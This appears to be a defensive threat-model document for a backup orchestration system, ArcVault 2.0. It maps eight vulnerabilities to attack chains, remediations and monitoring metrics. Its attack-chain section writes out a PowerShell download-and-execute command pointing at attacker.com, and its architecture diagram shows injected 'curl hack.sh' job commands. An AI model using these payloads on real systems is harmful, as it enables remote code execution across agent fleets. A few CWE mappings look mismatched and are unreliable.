# ArcVault 2.0 Threat Model & Attack Surface

## System Architecture

```
                         ┌─────────────────────────────────┐
                         │   Coordinator (Server)           │
                         │                                  │
                         │  ┌───────────────────────────┐   │
                         │  │  HTTP/HTTPS Server        │   │
                         │  │  :8080 or :8443           │   │
                         │  └───────────────────────────┘   │
                         │           ↑↓                      │
                         │  ┌───────────────────────────┐   │
                         │  │  CORS Middleware [P0-001] │   │
                         │  │  AllowedOrigins: "*"?     │   │
                         │  └───────────────────────────┘   │
                         │           ↑↓                      │
                         │  ┌───────────────────────────┐   │
                         │  │  WebSocket Hub [P0-002]   │   │
                         │  │  /ws (broadcast)          │   │
                         │  │  CheckOrigin: true?       │   │
                         │  └───────────────────────────┘   │
                         │           ↑↓                      │
                         │  ┌───────────────────────────┐   │
                         │  │  Auth Layer               │   │
                         │  │  AdminToken [P0-004]      │   │
                         │  │  JWT Secret (plaintext)   │   │
                         │  └───────────────────────────┘   │
                         │           ↑↓                      │
                         │  ┌───────────────────────────┐   │
                         │  │  Job Management API       │   │
                         │  │  /api/jobs                │   │
                         │  │  /api/templates           │   │
                         │  └───────────────────────────┘   │
                         │           ↑↓                      │
                         │  ┌───────────────────────────┐   │
                         │  │  Scheduler [P0-007]       │   │
                         │  │  N+1 queries every 60s    │   │
                         │  └───────────────────────────┘   │
                         │           ↑↓                      │
                         │  ┌───────────────────────────┐   │
                         │  │  SQLite Database          │   │
                         │  │  config.json [P0-004]     │   │
                         │  └───────────────────────────┘   │
                         └─────────────────────────────────┘
                                     ↑↓
                    ┌────────────────┴────────────────┐
                    │                                 │
         ┌──────────▼───────────┐        ┌────────────▼──────────┐
         │   Agent 1 (Windows)  │        │   Agent N (Linux)     │
         │                      │        │                       │
         │ /api/jobs?agent=1    │        │ /api/jobs?agent=N     │
         │ Polls every 30s      │        │ Polls every 30s [P0-008]
         │ [P0-008 - no jitter] │        │                       │
         │                      │        │                       │
         │ ┌──────────────────┐ │        │ ┌──────────────────┐  │
         │ │ Command Executor │ │        │ │ Command Executor │  │
         │ │ [P0-003]         │ │        │ │ [P0-003]         │  │
         │ │ job.Command:     │ │        │ │ job.Command:     │  │
         │ │ "bash /tmp/x"    │ │        │ │ "curl hack.sh"   │  │
         │ └──────────────────┘ │        │ └──────────────────┘  │
         │                      │        │                       │
         │ ┌──────────────────┐ │        │ ┌──────────────────┐  │
         │ │SSH Credentials   │ │        │ │SSH Credentials   │  │
         │ │[P0-006]          │ │        │ │[P0-006]          │  │
         │ │Env: SSH_KEY_PATH │ │        │ │Env: SSH_KEY_PATH │  │
         │ │/tmp/ssh-key-*.pem│ │        │ │Race condition:   │  │
         │ │(race condition)  │ │        │ │multiple jobs     │  │
         │ └──────────────────┘ │        │ │share same var    │  │
         │                      │        │ └──────────────────┘  │
         └──────────────────────┘        └───────────────────────┘
                    ↑                                 ↑
                    │ Heartbeat every 60s            │
                    │ /api/agents/{id}/heartbeat     │
                    │                                │
                    └────────────────┬────────────────┘
                                     │
                          Network (TLS or plaintext)
```

---

## Assets Under Protection

### Tier 1: Critical (Confidentiality + Integrity + Availability)
| Asset | Located | Compromised If | Impact |
|-------|---------|----------------|--------|
| **Admin Token** | config.json [P0-004] | Exposed | Permanent API access, modify all data |
| **JWT Secret** | config.json [P0-004] | Exposed | Forge tokens, bypass auth |
| **SSH Private Keys** | /tmp/[job-specific] [P0-006] | Race condition | Access remote systems as wrong user |
| **Job Commands** | Database, API | Injected [P0-003] | RCE on all agents |

### Tier 2: High (Confidentiality + Integrity)
| Asset | Located | Exposed If | Impact |
|-------|---------|-----------|--------|
| **Backup Schedules** | Coordinator state | WebSocket breach [P0-002] | Know when backups run, exploit predictable behavior |
| **Credential Profiles** | Database | Admin token leaked [P0-004] | Access SMB/SSH credentials for all jobs |
| **Agent Status** | Broadcast hub | WebSocket bypass [P0-002] | Enumerate agent network, find vulnerable targets |

### Tier 3: Medium (Availability)
| Asset | Located | Affected If | Impact |
|-------|---------|------------|--------|
| **Scheduler Performance** | Coordinator | N+1 queries [P0-007] | Delayed job execution, missed backups |
| **Agent Fleet Health** | Polling mechanism | Fixed interval [P0-008] | Coordinator resource exhaustion, agent disconnection |
| **Database Consistency** | Scan error handling [P0-005] | Corrupted rows unlogged | Silent data loss, duplicate jobs |

---

## Attack Vectors & Chains

### Attack Chain 1: Information Disclosure (Network Attacker)

```
Network Attacker (no credentials)
  │
  ├─► Exploit P0-001 + P0-002 (CORS + WebSocket)
  │      Browser at attacker.com creates WebSocket to coordinator
  │      CORS wildcard permits cross-origin requests
  │      WebSocket CheckOrigin disabled accepts any origin
  │      │
  │      └─► WebSocket connection established from attacker.com
  │             ├── Receives all broadcast events:
  │             │   • job.completed {id, status, agent_id, source_path}
  │             │   • agent.heartbeat {agent_id, status, last_seen}
  │             │   • job.updated {id, status}
  │             │
  │             └─► Attacker exfiltrates backup schedule metadata
  │                 └─► Knows when backups run, what data is backed up,
  │                     which agents are online
  │
  └─► Result: Complete visibility into backup infrastructure
      without authentication
```

**Detection:** WebSocket upgrade from attacker.com domain  
**Prevention:** P0-001 (explicit CORS) + P0-002 (origin validation)

---

### Attack Chain 2: Privilege Escalation (Admin Access)

```
Attacker with Local Access
  │
  ├─► Read config.json (readable by service account) [P0-004]
  │      AdminToken: "abc123def456..." (plaintext)
  │      JWTSecret: "secret123..." (plaintext)
  │      │
  │      └─► Extract AdminToken
  │
  ├─► Use AdminToken to access API
  │      POST /api/auth/login
  │      Authorization: Bearer abc123def456...
  │      │
  │      └─► Get admin JWT token
  │
  ├─► Create malicious backup template [P0-003]
  │      POST /api/templates
  │      {
  │        "name": "Backup Production",
  │        "command": "powershell -Command 'IEX (New-Object Net.WebClient).DownloadString(attacker.com/stage2)'"
  │      }
  │      │
  │      └─► No whitelist prevents unauthorized commands
  │
  └─► Distribute template to agent group
      All agents execute attacker's PowerShell code
      Result: RCE on entire agent fleet
```

**Detection:** Template creation with suspicious commands  
**Prevention:** P0-003 (command whitelist) + P0-004 (env var tokens)

---

### Attack Chain 3: Credential Leakage (Concurrent Job Execution)

```
Compromised Agent (moderate access)
  │
  ├─► Coordinator assigns 2 concurrent backup jobs to same agent:
  │    • Job A: /home/alice → ssh://backup.corp (alice-key.pem)
  │    • Job B: /home/bob → ssh://backup.corp (bob-key.pem)
  │
  ├─► Agent runner executes both in parallel (goroutines) [P0-006]
  │      T0: Job A calls applySSHKeyCredentials(alice-key)
  │           os.Setenv("SSH_KEY_PATH", "/tmp/ssh-key-abc.pem")
  │      T1: Job B calls applySSHKeyCredentials(bob-key)
  │           os.Setenv("SSH_KEY_PATH", "/tmp/ssh-key-def.pem")  ← overwrites!
  │      T2: Job A runs rsync → uses /tmp/ssh-key-def.pem (WRONG KEY!)
  │           Alice's data backed up with Bob's credentials
  │           ├─► Data ends up in Bob's account on backup server
  │           ├─► Bob sees Alice's files in his backup location
  │           └─► Cross-user data contamination
  │
  └─► Result: Credential mixing, privilege escalation to other users' data
      Difficult to detect; timing-dependent race condition
```

**Detection:** SSH connection logs showing wrong user  
**Prevention:** P0-006 (per-job credential isolation)

---

### Attack Chain 4: DoS via Predictable Load (Network Attacker)

```
Attacker with Network Access
  │
  ├─► Observe polling pattern [P0-008]
  │    All 500 agents poll every 30 seconds at same boundary
  │    T=0s, T=30s, T=60s, ... spike observed
  │
  ├─► Synchronize malicious agent to send requests at same time
  │    Compromised agent: SetPollInterval to 1 second
  │    All 500 legitimate agents + 1 malicious = 501 concurrent requests
  │
  ├─► T=60s: All 501 agents poll simultaneously
  │    Coordinator processes 501 requests concurrently
  │    │
  │    ├─► Database lock (SQLite single-threaded)
  │    ├─► Admin UI becomes unresponsive
  │    ├─► Heartbeat responses delayed
  │    └─► Agents appear offline
  │
  └─► Result: Service degradation, false offline alerts
      With jitter, requests spread over 30-second window → no spike
```

**Detection:** Request latency spike at regular intervals  
**Prevention:** P0-008 (polling jitter eliminates predictability)

---

### Attack Chain 5: Silent Data Loss (Database Corruption)

```
Database Corruption Event
  │
  ├─► Transient disk error affects jobs table
  │    Row 5: SyncFlags column truncated (NULL where INT expected)
  │
  ├─► Operator calls ListJobs() [P0-005]
  │    Query returns 10 jobs
  │    │
  │    ├─► Row 5 Scan() fails (type mismatch)
  │    ├─► Error silently ignored with continue
  │    └─► Result: 9 jobs returned (1 missing)
  │
  ├─► Operator doesn't see error
  │    ├─► Assumes job 5 is completed
  │    ├─► May recreate it
  │    └─► Duplicate job silently created
  │
  └─► Result: Silent data loss illusion
      Operator unaware of database integrity issue
      Scheduled backup never runs again
      Data loss goes undetected for weeks
```

**Detection:** X-Partial-Results header, database integrity check API  
**Prevention:** P0-005 (error logging + return error to caller)

---

### Attack Chain 6: Scheduler Degradation (DoS via Load)

```
High Job Count (> 500 jobs)
  │
  ├─► checkMissedSchedules() runs every minute [P0-007]
  │    ├─► Query 1: SELECT id, name, agent_id, schedule FROM jobs
  │    │            WHERE schedule IS NOT NULL
  │    │            (returns 500 rows)
  │    │
  │    ├─► For each job (500 iterations):
  │    │    └─► Query 2: SELECT * FROM alert_rules WHERE job_id = ?
  │    │               (500 queries for 500 jobs)
  │    │
  │    └─► For each rule per job (500 jobs × 5 rules = 2500):
  │         ├─► Query 3: SELECT MAX(finished_at) FROM job_runs WHERE job_id = ?
  │         └─► Query 4: SELECT COUNT(*) FROM alert_history WHERE job_id = ...
  │
  ├─► Total Queries: 1 + 500 + 2500 + 2500 = 5,501 queries
  │    Sequential execution at 1ms/query = 5.5 seconds
  │
  ├─► During scheduler run (5.5 seconds):
  │    ├─► Database locked by scheduler
  │    ├─► Admin UI queries queued behind scheduler
  │    ├─► Agent polls blocked
  │    ├─► Agents appear offline
  │    └─► Job results delayed
  │
  └─► Result: Periodic 5+ second coordinator freezes every minute
      Cascading failures if multiple scheduler runs queue up
```

**Detection:** Scheduler runtime logs, coordinator request latency spikes  
**Prevention:** P0-007 (single batch query, database indexes)

---

## Threat Actors & Capabilities Matrix

| Actor | Access | Capability | Method | Vulns Exploited |
|-------|--------|-----------|--------|-----------------|
| **Network Attacker** | Network | Eavesdrop, MITM, DoS | Packet capture, WebSocket hijack | P0-001, P0-002, P0-008 |
| **Malicious Agent** | Agent process | RCE, credential access | Code execution, env var access | P0-003, P0-004, P0-006 |
| **Filesystem Attacker** | Local system | Read config, modify code | File access, backup reads | P0-004 |
| **Compromised Admin** | UI/API | Full API access | Social engineering, credential theft | P0-001, P0-003, P0-004 |
| **Supply Chain** | Build/deploy | Backdoor injection | Compromised dependency, config leak | P0-004 |

---

## Defense Layers & Remediation

### Layer 1: Perimeter (Network Edge)
```
                       Internet / Untrusted Network
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Firewall/WAF       │
                    │ (Should block)       │
                    └──────────────────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   CORS Validation    │ ◄─── P0-001 FIXES THIS
                    │   AllowedOrigins     │
                    │   No "*" in prod     │
                    └──────────────────────┘
```

### Layer 2: Authentication
```
                    HTTP Request with Origin
                               │
                               ▼
                    ┌──────────────────────┐
                    │ WebSocket Upgrade    │ ◄─── P0-002 FIXES THIS
                    │ CheckOrigin: true    │
                    │ (currently broken)   │
                    └──────────────────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ JWT / Admin Token    │ ◄─── P0-004 FIXES THIS
                    │ Verify signature     │      (env vars, not config)
                    │ Check expiration     │
                    └──────────────────────┘
```

### Layer 3: Authorization
```
                    Authenticated Request
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Role-Based Access    │
                    │ (admin, operator,    │
                    │  viewer)             │
                    └──────────────────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Job Command          │ ◄─── P0-003 FIXES THIS
                    │ Validation           │      (whitelist programs)
                    │ Whitelist check      │
                    └──────────────────────┘
```

### Layer 4: Execution
```
                    Approved Job Command
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Agent Credentials    │ ◄─── P0-006 FIXES THIS
                    │ Per-job isolation    │      (no global env vars)
                    │ Temp directory       │
                    └──────────────────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Execute Program      │
                    │ (rsync/robocopy)     │
                    │ No shell injection   │
                    └──────────────────────┘
```

### Layer 5: Operational Health
```
                    Coordinator Operations
                               │
            ┌──────────────────┼──────────────────┐
            │                  │                  │
            ▼                  ▼                  ▼
    ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
    │ Scheduler    │  │ Agent Polls  │  │ Database     │
    │ [P0-007]     │  │ [P0-008]     │  │ [P0-005]     │
    │ • Batch      │  │ • Jitter     │  │ • Error      │
    │   queries    │  │ • Spread     │  │   logging    │
    │ • Indexes    │  │   load       │  │ • Audit      │
    │ • Timeout    │  │               │  │   trail      │
    └──────────────┘  └──────────────┘  └──────────────┘
```

---

## Compliance & Standards

### OWASP Top 10 (2021) Coverage
- **A01:2021 – Broken Access Control:** P0-001, P0-002, P0-004
- **A02:2021 – Cryptographic Failures:** P0-004
- **A03:2021 – Injection:** P0-003
- **A04:2021 – Insecure Design:** P0-006 (race condition)
- **A05:2021 – Security Misconfiguration:** P0-004
- **A06:2021 – Vulnerable Components:** (external dependencies)
- **A07:2021 – Identification & Authentication Failures:** P0-004
- **A09:2021 – Logging & Monitoring:** P0-005
- **A10:2021 – Server-Side Request Forgery (SSRF):** N/A

### CWE Coverage
- **CWE-78:** OS Command Injection (P0-003)
- **CWE-252:** Unchecked Return Value (P0-005)
- **CWE-298:** Use of Expired File Descriptor (related to P0-006)
- **CWE-345:** Insufficient Verification of Data Authenticity (P0-002)
- **CWE-346:** Origin Validation Error (P0-001)
- **CWE-362:** Concurrent Execution with Shared Resource (P0-006)
- **CWE-674:** Uncontrolled Recursion (P0-008)
- **CWE-798:** Use of Hard-Coded Credentials (P0-004)
- **CWE-1025:** Comparison Using Wrong Factors (P0-007)

---

## Post-Remediation Monitoring

### Security Metrics
```
CORS/WebSocket Rejections:
  Expected: 0 (legitimate clients)
  Alert if: > 10/day (possible attacks)

Command Validation Failures:
  Expected: 0 (after audit completion)
  Alert if: > 0 (unauthorized template)

DB Scan Errors:
  Expected: 0 (healthy database)
  Alert if: > 0 (corruption detected)

SSH Key Cleanup:
  Expected: 0 orphaned keys in /tmp
  Alert if: > 0 (cleanup failed)
```

### Operational Metrics
```
Scheduler Runtime:
  Before remediation: 3-5 seconds
  After remediation: < 1 second
  Alert if: > 2 seconds

Coordinator Request Latency:
  Before: Spikes to 3-5 seconds every 30s
  After: Steady 100-200ms
  Alert if: > 500ms sustained

Agent Offline Rate:
  Before: ~5-10% during polling spikes
  After: < 1%
  Alert if: > 5% (network issue)
```

---

## Conclusion

ArcVault 2.0's distributed architecture creates inherent security challenges:
- **Coordinator** is high-value target (backup metadata, credentials, schedule)
- **Agent network** is untrusted (any agent could be compromised)
- **Credential management** is complex (SSH keys, passwords, tokens)

The eight P0 vulnerabilities span all layers (auth, execution, operations). While no single vuln causes total compromise, **chaining 2-3 enables significant attacks**. Remediation is straightforward and low-risk when applied in phased order.

**Critical Path:** Phase 1 (auth fixes) → Phase 2 (execution hardening) → Phase 3 (operational stability)

---

**Document:** THREAT_MODEL.md  
**Status:** READY FOR ELENA VASQUEZ REVIEW  
**Next:** Architecture review meeting to finalize remediation strategy
